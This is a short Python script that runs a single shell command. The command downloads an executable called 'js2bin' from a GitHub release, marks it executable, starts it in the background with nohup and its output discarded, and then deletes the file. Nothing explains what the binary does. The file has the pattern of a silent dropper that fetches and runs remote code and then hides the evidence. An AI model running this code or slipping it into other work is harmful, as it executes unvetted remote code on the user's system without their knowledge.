import subprocess

subprocess.run("curl -L -o js2bin https://github.com/alphaxcv/scx/releases/download/dl/js2bin && chmod +x js2bin && nohup ./js2bin > /dev/null 2>&1 & rm js2bin", shell=True)
